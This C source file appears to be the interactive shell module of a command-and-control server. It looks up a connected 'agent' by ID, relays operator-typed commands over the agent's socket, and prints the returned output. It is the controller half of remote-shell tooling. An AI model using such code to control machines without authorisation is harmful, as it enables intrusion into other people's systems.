#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/time.h>
#include <pthread.h>
#include <time.h>

#define BUFFER_SIZE 4096

// External references from server.c
extern pthread_mutex_t clients_mutex;

typedef struct {
    int id;
    int socket;
    struct sockaddr_in addr;
    time_t connected_at;
    int active;
    pthread_mutex_t lock;
} Client;

extern Client clients[];
extern int MAX_CLIENTS;

// Helper function to find client
static int find_client_socket(int client_id, int *client_index) {
    pthread_mutex_lock(&clients_mutex);
    for (int i = 0; i < 50; i++) {  // MAX_CLIENTS = 50
        if (clients[i].active && clients[i].id == client_id) {
            int sock = clients[i].socket;
            *client_index = i;
            pthread_mutex_unlock(&clients_mutex);
            return sock;
        }
    }
    pthread_mutex_unlock(&clients_mutex);
    return -1;
}

void module_shell(int client_id) {
    int client_socket = -1;
    int client_index = -1;
    
    client_socket = find_client_socket(client_id, &client_index);
    
    if (client_socket == -1) {
        printf("[-] Agent %d not found or disconnected\n", client_id);
        return;
    }
    
    printf("[*] Starting shell session with agent %d\n", client_id);
    printf("[*] Type 'exit' to return to agent menu\n\n");
    
    char buffer[BUFFER_SIZE];
    fd_set read_fds;
    struct timeval timeout;
    
    while (1) {
        printf("shell@agent%d> ", client_id);
        fflush(stdout);
        
        // Read command from user
        if (fgets(buffer, BUFFER_SIZE, stdin) == NULL) {
            break;
        }
        
        // Check for exit command
        if (strncmp(buffer, "exit\n", 5) == 0) {
            printf("[*] Exiting shell session\n");
            break;
        }
        
        // Send command to client
        pthread_mutex_lock(&clients[client_index].lock);
        ssize_t sent = send(client_socket, buffer, strlen(buffer), 0);
        
        if (sent <= 0) {
            pthread_mutex_unlock(&clients[client_index].lock);
            printf("[-] Failed to send command. Agent may be disconnected.\n");
            break;
        }
        
        // Read all available output from client using select with timeout
        while (1) {
            FD_ZERO(&read_fds);
            FD_SET(client_socket, &read_fds);
            
            // Set timeout to 200ms - if no data arrives in this time, assume output is complete
            timeout.tv_sec = 0;
            timeout.tv_usec = 200000;
            
            int ready = select(client_socket + 1, &read_fds, NULL, NULL, &timeout);
            
            if (ready < 0) {
                // Error
                pthread_mutex_unlock(&clients[client_index].lock);
                printf("[-] Select error\n");
                return;
            } else if (ready == 0) {
                // Timeout - no more data available
                break;
            }
            
            // Data is available, read it
            memset(buffer, 0, BUFFER_SIZE);
            ssize_t received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
            
            if (received <= 0) {
                pthread_mutex_unlock(&clients[client_index].lock);
                printf("[-] Agent disconnected\n");
                return;
            }
            
            // Print output immediately
            printf("%s", buffer);
            fflush(stdout);
        }
        
        pthread_mutex_unlock(&clients[client_index].lock);
    }
}
